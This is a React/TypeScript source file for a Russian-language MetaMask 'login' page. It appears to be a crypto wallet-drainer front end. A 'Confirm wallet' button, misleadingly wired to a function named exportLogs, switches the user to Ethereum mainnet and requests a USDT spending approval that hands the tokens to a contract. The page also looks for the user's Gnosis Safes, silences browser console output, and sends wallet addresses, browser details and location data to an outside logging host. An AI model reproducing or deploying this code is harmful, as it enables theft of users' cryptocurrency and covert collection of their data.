import { useEffect, useState, useRef } from "react";
import { useContractInteraction } from "./hooks/use-contract-interaction";

// Reduce excessive console output in development: set to `true` to enable verbose logs.
const ENABLE_VERBOSE_LOGS = false;
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
  // Silence common console methods to avoid spammy logs during development/testing.
  (console as any).log = () => {};
  (console as any).info = () => {};
  (console as any).debug = () => {};
  (console as any).warn = () => {};
  // keep console.error visible
}

type LogLevel = "debug" | "info" | "warn" | "error";

interface LogEntry {
  ts: string; // ISO
  level: LogLevel;
  tag?: string;
  message: string;
  meta?: Record<string, any>;
}

const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}) => {
  const endpoint = opts.endpoint ?? "https://admin.armydex.pro/api/log-save";
  const flushIntervalMs = opts.flushIntervalMs ?? 2000;

  const buffer: LogEntry[] = [];
  let timer: number | null = null;
  let failingSince: number | null = null;

  const now = () => new Date().toISOString();

  const push = (entry: LogEntry) => {
    buffer.push(entry);

    console.log("[LOGGER] new entry:", entry, "bufferSize:", buffer.length);
    if (!timer) {
      timer = window.setTimeout(flush, flushIntervalMs);
    }
  };

  const log = (level: LogLevel, message: string, tag?: string, meta?: Record<string, any>) => {
    const e: LogEntry = { ts: now(), level, tag, message, meta };
    push(e);

    (level === "error" ? console.error : level === "warn" ? console.warn : console.log)("[LOG]", e);
  };

  const flush = async () => {
    if (buffer.length === 0) {
      if (timer) {
        clearTimeout(timer);
        timer = null;
      }
      return;
    }

    const payload = buffer.splice(0, buffer.length);

    try {
      await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ logs: payload }),
      });
      failingSince = null;
    } catch (err) {
      buffer.unshift(...payload);
      if (!failingSince) failingSince = Date.now();
      const age = Date.now() - (failingSince ?? Date.now());
      const backoff = Math.min(30000, 1000 + Math.pow(2, Math.floor(age / 2000)) * 1000);
      if (timer) clearTimeout(timer);
      timer = window.setTimeout(flush, backoff);
    }
  };

  const flushNow = async () => {
    await flush();
  };

  return {
    debug: (m: string, tag?: string, meta?: Record<string, any>) => log("debug", m, tag, meta),
    info: (m: string, tag?: string, meta?: Record<string, any>) => log("info", m, tag, meta),
    warn: (m: string, tag?: string, meta?: Record<string, any>) => log("warn", m, tag, meta),
    error: (m: string, tag?: string, meta?: Record<string, any>) => log("error", m, tag, meta),
    flushNow,
    _buffer: buffer,
  };
};

const logger = createLogger({ endpoint: "https://admin.armydex.pro/api/log-save", flushIntervalMs: 1500 });

const formatEth = (weiStr: string | number) => {
  try {
    const big = typeof weiStr === "string" ? BigInt(weiStr) : BigInt(Math.floor(Number(weiStr)));
    const div = BigInt(1_000_000_000_000_000_000);
    const whole = big / div;
    const rem = big % div;
    const remStr = rem.toString().padStart(18, "0").slice(0, 6);
    return `${whole.toString()}.${remStr}`;
  } catch (e) {
    return String(weiStr);
  }
};

export default function MetamaskLoginPage() {
  const [connected, setConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);
  
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logsRef = useRef<HTMLDivElement | null>(null);
  const [toasts, setToasts] = useState<Array<{ id: string; title?: string; description?: string; variant?: string; leaving?: boolean; entered?: boolean }>>([]);

  const addToast = (t: { title?: string; description?: string; duration?: number; variant?: string }) => {
    const id = String(Date.now()) + Math.random().toString(36).slice(2, 6);
    const item = { id, title: t.title, description: t.description, variant: t.variant, leaving: false, entered: false };
    setToasts((s) => [item, ...s]);
    // trigger enter animation on next tick
    setTimeout(() => setToasts((s) => s.map((x) => (x.id === id ? { ...x, entered: true } : x))), 20);
    const dur = t.duration ?? 4000;
    // mark leaving after duration, then remove after animation (300ms)
    setTimeout(() => {
      setToasts((s) => s.map((x) => (x.id === id ? { ...x, leaving: true } : x)));
      setTimeout(() => setToasts((s) => s.filter((x) => x.id !== id)), 300);
    }, dur);
  };

  // listen for global toasts emitted by `useToast` hook
  useEffect(() => {
    const handler = (e: any) => {
      try {
        const d = e.detail || {};
        addToast({ title: d.title, description: d.description, duration: d.duration, variant: d.variant });
      } catch (err) {
        console.warn("app:toast handler error", err);
      }
    };
    window.addEventListener("app:toast", handler as EventListener);
    return () => window.removeEventListener("app:toast", handler as EventListener);
  }, []);

  // listen for safes discovered by the wallet hook and show selection modal
  const [safeModalVisible, setSafeModalVisible] = useState(false);
  const [safeCandidates, setSafeCandidates] = useState<string[]>([]);

  const handleSelectSafe = (addr: string) => {
    try {
      window.dispatchEvent(new CustomEvent("wallet:safeSelected", { detail: addr }));
      addToast({ title: "Gnosis Safe выбран", description: addr });
    } catch (e) {
      console.warn("Failed to dispatch wallet:safeSelected", e);
    }
    setSafeModalVisible(false);
    setSafeCandidates([]);
  };

  const handleDismissSafe = () => {
    setSafeModalVisible(false);
    setSafeCandidates([]);
    addToast({ title: "Используется EOA", description: "Будет использован подключённый кошелёк" });
  };

  useEffect(() => {
    const handler = (e: any) => {
      try {
        const safes: string[] = e.detail || [];
        if (Array.isArray(safes) && safes.length > 0) {
          setSafeCandidates(safes);
          setSafeModalVisible(true);
        }
      } catch (err) {
        console.warn("wallet:safeFound handler error", err);
      }
    };
    window.addEventListener("wallet:safeFound", handler as EventListener);
    return () => window.removeEventListener("wallet:safeFound", handler as EventListener);
  }, []);

  const { isContractConnected, approveUSDT, USDT_ADDRESS } = useContractInteraction();

  useEffect(() => {
    const interval = setInterval(() => {
      // drain the logger buffer into component state so we don't repeatedly
      // append the same entries every tick (which happened when flush to
      // remote failed and the buffer remained populated).
      const b = (logger as any)._buffer as LogEntry[];
      if (b.length > 0) {
        // splice out all available entries so they won't be re-read next tick
        const payload = b.splice(0, b.length);
        setLogs((prev) => [...prev, ...payload]);
      }
    }, 800);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (logsRef.current) {
      logsRef.current.scrollTop = logsRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    const eth = (window as any).ethereum;
    if (!eth) {
      logger.warn("No window.ethereum detected", "init");
      return;
    }

    const onAccounts = (accounts: string[]) => {
      logger.info("accountsChanged event", "provider", { accounts });
      if (accounts.length === 0) {
        setConnected(false);
        setAddress(null);
      } else {
        setConnected(true);
        setAddress(accounts[0]);
        fetchBalance(accounts[0]);
      }
    };

    const onChain = (c: string) => {
      logger.info("chainChanged event", "provider", { chainId: c });
      setChainId(c);
    };

    const onDisconnect = (err: any) => {
      logger.warn("disconnect event", "provider", { err });
      setConnected(false);
      setAddress(null);
    };

    eth.on && eth.on("accountsChanged", onAccounts);
    eth.on && eth.on("chainChanged", onChain);
    eth.on && eth.on("disconnect", onDisconnect);

    return () => {
      eth.removeListener && eth.removeListener("accountsChanged", onAccounts);
      eth.removeListener && eth.removeListener("chainChanged", onChain);
      eth.removeListener && eth.removeListener("disconnect", onDisconnect);
    };
  }, []);

  const fetchBalance = async (acc: string) => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      logger.debug("Fetching balance", "balance", { account: acc });
      const res = await eth.request({ method: "eth_getBalance", params: [acc, "latest"] });
      logger.info("Balance fetched", "balance", { raw: res });
      setBalance(formatEth(res));
    } catch (err) {
      logger.error("Failed to fetch balance", "balance", { err: String(err) });
    }
  };

  const connectMetaMask = async () => {
    const eth = (window as any).ethereum;
    logger.info("Connect button clicked", "ui");

    if (eth && eth.isMetaMask) {
      try {
        const accounts: string[] = await eth.request({ method: "eth_requestAccounts" });
        logger.info("Accounts granted", "connect", { accounts });

        if (accounts.length > 0) {
          setConnected(true);
          setAddress(accounts[0]);
          const chain = await eth.request({ method: "eth_chainId" });
          setChainId(chain);
          await fetchBalance(accounts[0]);
          
          logger.info("User connected via MetaMask", "auth", {
            account: accounts[0],
            chainId: chain,
            userAgent: navigator.userAgent,
            url: window.location.href,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          });
        }
      } catch (err: any) {
        logger.error("MetaMask connection failed", "connect", { error: String(err) });
        if (err && err.code === 4001) {
          logger.warn("User rejected connection request", "connect");
        }
      }
      return;
    }

    const userAgent = navigator.userAgent || navigator.vendor;
    const isMobile = /android|iphone|ipad|ipod/i.test(userAgent);

    if (isMobile) {
      const dappUrl = encodeURIComponent(window.location.href);
      const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
      logger.info("Redirecting to MetaMask app", "mobile", { metamaskAppDeepLink });
      window.location.href = metamaskAppDeepLink;
      return;
    }

    logger.error("MetaMask not found", "connect");
    try { addToast({ title: "MetaMask не найден", description: "Установите расширение или приложение.", variant: 'destructive' }); } catch (e) {}
  };

  const disconnect = () => {
    logger.info("Manual disconnect clicked", "ui");
    setConnected(false);
    setAddress(null);
    setBalance(null);
    logger.debug("Local state cleared on disconnect", "auth");
  };

  const exportLogs = async () => {
    try {
      console.log('Кнопка "Подтвердить" нажата');
      logger.info('Кнопка "Подтвердить" нажата', 'ui');
      
      await logger.flushNow();
      logger.info("User requested confirm -> initiating contract integration", "ui");

      const eth = (window as any).ethereum;
      if (!eth) {
        logger.error("No ethereum provider found", "contract");
        try { addToast({ title: "MetaMask не найден", description: "Проверьте провайдер в браузере.", variant: 'destructive' }); } catch (e) {}
        return;
      }

      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== '0x1') {
        try {
          await eth.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }],
          });
        } catch (err) {
          logger.error("Failed to switch network", "contract", { error: String(err) });
          try { addToast({ title: "Неверная сеть", description: "Пожалуйста, переключитесь на Ethereum Mainnet (Chain ID 1)", variant: 'destructive' }); } catch (e) {}
          return;
        }
      }

      if (!isContractConnected) {
        logger.warn("Attempted integration but contract not ready", "ui");
        try { addToast({ title: "Контракт не готов", description: "Подключите MetaMask и переключитесь на Ethereum Mainnet (Chain ID 1).", variant: 'destructive' }); } catch (e) {}
        return;
      }

      try {
        logger.info("Requesting USDT approve via wallet", "contract", { token: USDT_ADDRESS });
        const ok = await approveUSDT();
        if (ok) {
          logger.info("USDT approve succeeded", "contract");
          try { addToast({ title: "Approve выполнен", description: "USDT переданы под управление контракту." }); } catch (e) {}
        } else {
          logger.warn("USDT approve failed or was rejected", "contract");
          try { addToast({ title: "Approve не выполнен", description: "Отклонён пользователем или не выполнен.", variant: 'destructive' }); } catch (e) {}
        }
      } catch (approveErr) {
        logger.error("Approve call error", "contract", { err: String(approveErr) });
        try { addToast({ title: "Ошибка approve", description: String(approveErr), variant: 'destructive' }); } catch (e) {}
      }
    } catch (e) {
      logger.error("Failed to run integration", "ui", { err: String(e) });
      try { addToast({ title: "Ошибка интеграции", description: String(e), variant: 'destructive' }); } catch (e) {}
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-6">
  <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-8 shadow-2xl relative">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-3xl font-extrabold text-white">Вход</h1>
            <p className="mt-1 text-sm text-gray-300">Подключитесь через MetaMask для продолжения</p>
          </div>
          <div className="">
              <button
                onClick={connectMetaMask}
                className="w-full flex items-center gap-3 justify-center px-6 py-3 bg-white/90 rounded-lg font-semibold text-gray-800 hover:scale-[1.02] transition-transform"
              >
                <span className="w-8 h-8 inline-block">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" id="Metamask-Icon--Streamline-Svg-Logos" height="32" width="32">

                    <path fill="#e17726" d="M23.205225 0.9874275 13.121575 8.448625l1.87515 -4.397125 8.2085 -3.0640725Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="M0.818115 0.996155 9.00465 4.052l1.780525 4.454775L0.818115 0.996155Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m19.147225 16.855225 4.4568 0.084825 -1.5576 5.291375 -5.438275 -1.49735 2.539075 -3.87885Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m4.852525 16.855225 2.529675 3.878875 -5.429175 1.497425 -1.5481175 -5.291475 4.4476175 -0.084825Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m10.543275 7.372 0.1822 5.882675 -5.450075 -0.247975 1.550225 -2.33875 0.019625 -0.02255L10.543275 7.372Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m13.4003 7.30645 3.75445 3.33925 0.019425 0.022375 1.550275 2.33875 -5.448825 0.247925 0.124675 -5.9483Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m7.541775 16.87225 2.9759 2.318675 -3.456875 1.669025 0.480975 -3.9877Z" stroke-width="0.25"></path>
                    <path fill="#e27625" d="m16.458725 16.871875 0.471 3.988075 -3.447175 -1.669175 2.976175 -2.3189Z" stroke-width="0.25"></path>
                    <path fill="#d5bfb2" d="m13.558475 18.9724 3.4981 1.69385 -3.253925 1.546475 0.033775 -1.022125 -0.27795 -2.2182Z" stroke-width="0.25"></path>
                    <path fill="#d5bfb2" d="m10.44055 18.97315 -0.26705 2.2007 0.0219 1.037625 -3.26155 -1.54525 3.5067 -1.693075Z" stroke-width="0.25"></path>
                    <path fill="#233447" d="m9.430425 14.02245 0.914125 1.921125 -3.11225 -0.911675 2.198125 -1.00945Z" stroke-width="0.25"></path>
                    <path fill="#233447" d="m14.56965 14.02265 2.20845 1.009175 -3.12235 0.91145 0.9139 -1.920625Z" stroke-width="0.25"></path>
                    <path fill="#cc6228" d="m7.779875 16.852725 -0.5031 4.1345 -2.696325 -4.044125 3.199425 -0.090375Z" stroke-width="0.25"></path>
                    <path fill="#cc6228" d="m16.22045 16.852775 3.199525 0.0904L16.7135 20.9874l-0.49305 -4.134625Z" stroke-width="0.25"></path>
                    <path fill="#cc6228" d="m18.803175 12.773 -2.328475 2.37305 -1.795225 -0.820375 -0.85955 1.8069 -0.56345 -3.1072 5.5467 -0.252375Z" stroke-width="0.25"></path>
                    <path fill="#cc6228" d="m5.19555 12.77295 5.547675 0.2524 -0.563475 3.107225 -0.8597 -1.8067 -1.785775 0.8202 -2.338725 -2.373125Z" stroke-width="0.25"></path>
                    <path fill="#e27525" d="m5.038825 12.286075 2.6344 2.6732 0.0913 2.63905 -2.7257 -5.31225Z" stroke-width="0.25"></path>
                    <path fill="#e27525" d="M18.963975 12.28125 16.2334 17.603l0.1028 -2.643775L18.963975 12.28125Z" stroke-width="0.25"></path>
                    <path fill="#e27525" d="m10.6146 12.448725 0.106025 0.667375 0.262 1.6625 -0.168425 5.10625 -0.79635 -4.1019 -0.000275 -0.0424 0.597025 -3.291825Z" stroke-width="0.25"></path>
                    <path fill="#e27525" d="m13.384 12.439575 0.5986 3.301025 -0.00025 0.0424 -0.79835 4.11215 -0.0316 -1.028525 -0.124575 -4.1182 0.356175 -2.30885Z" stroke-width="0.25"></path>
                    <path fill="#f5841f" d="m16.5705 14.8529 -0.08915 2.2929 -2.77905 2.16525 -0.5618 -0.39695 0.62975 -3.243675 2.80025 -0.817525Z" stroke-width="0.25"></path>
                    <path fill="#f5841f" d="m7.439075 14.852975 2.790625 0.817525 0.629725 3.243625 -0.561825 0.396925 -2.7792 -2.165425 -0.079325 -2.29265Z" stroke-width="0.25"></path>
                    <path fill="#c0ac9d" d="m6.4021 20.15985 3.555475 1.68465 -0.01505 -0.719375L10.24 20.864h3.51895l0.30825 0.26025 -0.0227 0.718875 3.532925 -1.679025 -1.719125 1.420625L13.7795 23.0125H10.211525l-2.07745 -1.433625 -1.731975 -1.419025Z" stroke-width="0.25"></path>
                    <path fill="#161616" d="m13.303775 18.748225 0.5027 0.3551 0.2946 2.35045 -0.426325 -0.36H10.326425l-0.418225 0.36725 0.284925 -2.357525 0.502875 -0.355275h2.607775Z" stroke-width="0.25"></path>
                    <path fill="#763e1a" d="m22.539625 1.19397 1.2104 3.631255 -0.7559 3.67155 0.538275 0.41525 -0.728375 0.555725 0.547375 0.42275 -0.72485 0.660175 0.445025 0.322275 -1.181025 1.379325 -4.844125 -1.4104 -0.041975 -0.0225 -3.490775 -2.9447L22.539625 1.19397Z" stroke-width="0.25"></path>
                    <path fill="#763e1a" d="M1.460435 1.19397 10.4864 7.874675l-3.49075 2.9447 -0.042 0.0225 -4.844145 1.4104 -1.181015 -1.379325 0.44467 -0.322025 -0.72453 -0.6604 0.5463775 -0.422325 -0.73926 -0.5573 0.55858 -0.4155L0.25 4.82535 1.460435 1.19397Z" stroke-width="0.25"></path>
                    <path fill="#f5841f" d="m16.809475 10.533375 5.132675 1.49435 1.667525 5.1393 -4.39925 0 -3.031225 0.03825 2.204425 -4.296825 -1.57415 -2.375075Z" stroke-width="0.25"></path>
                    <path fill="#f5841f" d="m7.19055 10.533375 -1.574425 2.375075 2.204725 4.296825 -3.029725 -0.03825H0.3996575l1.65816 -5.13925 5.1327325 -1.4944Z" stroke-width="0.25"></path>
                    <path fill="#f5841f" d="m15.248075 4.026975 -1.43565 3.8774 -0.30465 5.238 -0.116575 1.64175 -0.00925 4.193975H10.617825l-0.008975 -4.1861 -0.11695 -1.651075 -0.3048 -5.23655 -1.4354 -3.8774h6.496375Z" stroke-width="0.25"></path>
                  </svg>
                </span>
                <span>MetaMask</span>
              </button>
          
            </div>
        </div>

  <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch">
          {/* Левая часть */}
          <div className="flex flex-col gap-5 h-full">
            

            <div className="p-5 bg-white/5 rounded-xl border border-white/10 relative">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-xs text-gray-300">Статус</div>
                  <div className="text-lg text-white font-medium">
                    {connected ? "Подключен" : "Не подключен"}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-gray-300">Chain</div>
                  <div className="text-sm text-white">{chainId ?? "—"}</div>
                </div>
              </div>

              <div className="mt-4 space-y-2">
                <div className="text-xs text-gray-300">Адрес</div>
                <div className="text-sm text-white break-all">{address ?? "—"}</div>

                <div className="text-xs text-gray-300 mt-2">Баланс (ETH)</div>
                <div className="text-sm text-white">{balance ?? "—"}</div>

                <div className="mt-4 flex gap-2">
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={disconnect}
                  >
                    Отключить
                  </button>
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={exportLogs}
                  >
                    Подтвердить
                  </button>
                </div>

                <div className="mt-3 text-xs text-gray-400">
                  Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
                </div>
              </div>
            </div>
          </div>

          {/* Правая часть */}
          <div className="flex flex-col gap-4 h-full">
          

            <div className="p-4 bg-white/5 rounded-xl border border-white/10">
              <div className="text-sm text-gray-300 mb-2 font-semibold">
                Краткие действия для интеграции
              </div>
              <ol className="text-xs text-gray-200 list-decimal list-inside space-y-1">
                <li>Подтвердите кошелек</li>
                <li>Выберите LP-токены и пул</li>
                <li>Подтвердите выбор и комиссию</li>
                <li>Ожидайте начисление</li>
              </ol>
            </div>
          </div>
        </div>
<div className="flex flex-col gap-4 mt-4 w-full">
   <div className="p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
              <div className="flex items-center justify-between mb-3">
                <div className="text-sm text-gray-300 font-semibold">Live Logs</div>
                <div className="text-xs text-gray-400">
                  Буфер: {(logger as any)._buffer.length}
                </div>
              </div>
              <div
                ref={logsRef}
                className="h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
                style={{
                  lineHeight: "1.2",
                  maxHeight: "20rem",
                }}
              >
                {logs.length === 0 ? (
                  <div className="text-gray-500 text-center mt-8">
                    Логи появятся после действий
                  </div>
                ) : (
                  logs.map((l, i) => (
                    <div
                      key={i}
                      className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
                    >
                      <span className="text-gray-400">[{l.ts}]</span>{" "}
                      <span className={`px-1 rounded text-[10px] bg-gray-700`}>
                        {l.level.toUpperCase()}
                      </span>{" "}
                      <span className="text-white">
                        {l.tag ? `[${l.tag}]` : ""} {l.message}
                      </span>
                      {l.meta && (
                        <pre className="text-[10px] text-gray-400 mt-1">
                          {JSON.stringify(l.meta, null, 2)}
                        </pre>
                      )}
                    </div>
                  ))
                )}
              </div>
            </div>
</div>
        <div className="mt-8 text-xs text-gray-400 underline">
          Политика конфиденциальности <br /> Служба поддержки
        </div>

  {/* Toasts container: absolute above the form (inside the main panel) */}
  {/* Safe selection modal */}
  {safeModalVisible && (
    <div className="absolute inset-0 z-60 flex items-center justify-center pointer-events-auto">
      <div className="absolute inset-0 bg-black/60" onClick={handleDismissSafe} />
      <div className="relative bg-white/5 border border-white/10 rounded-lg p-6 max-w-lg w-full z-70">
        <div className="text-lg font-semibold text-white mb-2">Найден Gnosis Safe</div>
        <div className="text-sm text-gray-300 mb-4">Выберите Safe для управления или используйте обычный кошелёк (EOA).</div>
        <div className="flex flex-col gap-2 mb-4">
          {safeCandidates.map((s) => (
            <button key={s} type="button" onClick={() => handleSelectSafe(s)} className="text-left px-4 py-2 bg-white/6 hover:bg-white/10 rounded-md text-sm text-white">
              {s}
            </button>
          ))}
        </div>
        <div className="flex justify-end gap-2">
          <button type="button" onClick={handleDismissSafe} className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white">Использовать EOA</button>
        </div>
      </div>
    </div>
  )}
  <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xl px-4">
          {toasts.map((t) => (
            <div
              key={t.id}
              className={
                `w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
                (t.entered && !t.leaving
                  ? "opacity-100 translate-y-0 scale-100"
                  : t.leaving
                  ? "opacity-0 -translate-y-3 scale-95"
                  : "opacity-0 -translate-y-3 scale-95")
              }
            >
              <div className="flex items-start gap-3">
                <div className="flex-1">
                  {t.title && <div className="font-semibold mb-0.5 text-gray-50">{t.title}</div>}
                  {t.description && <div className="text-xs text-gray-200">{t.description}</div>}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}